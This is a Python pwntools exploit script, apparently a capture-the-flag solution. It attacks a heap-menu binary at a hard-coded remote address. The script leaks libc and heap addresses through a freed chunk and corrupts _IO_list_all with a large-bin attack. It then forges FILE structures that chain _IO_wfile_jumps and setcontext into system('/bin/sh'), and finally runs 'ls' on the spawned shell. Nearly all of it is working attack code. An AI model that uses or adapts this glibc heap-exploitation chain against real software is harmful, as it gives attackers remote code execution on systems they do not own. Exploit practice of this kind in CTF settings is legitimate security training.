from pwn import *
context(os='linux', arch='amd64')
p=remote("13.238.150.105",36970)
xor_bytes=[0x53, 0x68, 0x1F, 0x74, 0x21, 0x6D, 0x65, 0x90]
_IO_list_all_offset=0x21b680
_IO_wfile_jumps_offset=0x2170c0
main_arena_offset=0x21ac80
setcontext_offset=0x539e0
system_offset=0x50d70
bin_sh_offset=0x1d8678

def add(idx,size):
    p.sendlineafter("> ",b'1')
    p.sendlineafter("slot:",str(idx))
    p.sendlineafter("size:",str(size))
def free(idx):
    p.sendlineafter("> ",b'2')
    p.sendlineafter("slot:",str(idx))
def edit(idx,payload):
    p.sendlineafter("> ",b'3')
    p.sendlineafter("slot:",str(idx))
    payload=bytearray(payload)
    for i in range(len(payload)):
        payload[i]^=xor_bytes[i%8]
    p.send(bytes(payload))

def read(idx,l,r):
    p.sendlineafter("> ",b'4')
    p.sendlineafter("slot: ",str(idx))
    return p.recvuntil('==',drop=True)[l:r]
def qt():
    p.sendlineafter("> ",b'5')

add(0,0x450)#A
add(1,0x450)
add(2,0x440)#B
add(3,0x440)

free(0)
main_arena=u64(read(0,0,8))-0x60
libc=main_arena-main_arena_offset
print("main_arena=",hex(main_arena))
print("libc=",hex(libc))

add(4,0x4c0)

A_base=u64(read(0,16,24))
print("A_base=",hex(A_base))



B_base=A_base+0x460+0x460

payload=bytearray(b'\x00'*0x440)
def set_payload(idx,val):
    idx-=0x10
    val=p64(val)
    for i in range(8):
        payload[idx+i]=val[i]
set_payload(0x68,bin_sh_offset+libc)
set_payload(0x88,B_base+0x400)
set_payload(0xa0,B_base+0x208)
set_payload(0xa8,system_offset+libc)
set_payload(0xd8,_IO_wfile_jumps_offset+libc)
set_payload(0xe0, B_base+0x410)
set_payload(0x208+0x20,1)
set_payload(0x208+0xe0,B_base+0x300)
set_payload(0x300+0x68,setcontext_offset+libc)
edit(2,bytes(payload))

edit(0,b'a'*0x18+p64(libc+_IO_list_all_offset-0x20)+b'a'*0x430)
free(2)
add(5,0x4c0)

qt()
p.sendlineafter("bye\n","ls")
print(p.recvline())
